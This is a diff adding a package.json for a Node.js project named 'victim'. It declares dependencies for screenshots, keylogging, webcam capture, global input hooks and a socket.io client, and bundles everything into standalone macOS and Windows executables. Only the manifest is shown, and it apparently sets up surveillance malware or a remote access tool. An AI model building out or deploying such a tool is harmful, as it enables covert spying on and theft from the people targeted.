@@ -1,0 +1,26 @@
+{
+  "name": "victim",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {
+    "run": "node index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "pkg": {
+    "assets": [
+      "node_modules/**/*",
+      "index.js"
+    ],
+    "targets": [
+      "node12-macos-x64",
+      "node10-win-x64"
+    ]
+  },
+  "dependencies": {
+    "desktop-screenshot": "^0.1.1",
+    "node-keylogger": "^0.0.1",
+    "node-webcam": "^0.8.0",
+    "socket.io-client": "^4.4.1",
+    "iohook": "0.9.3"
+  }
+}
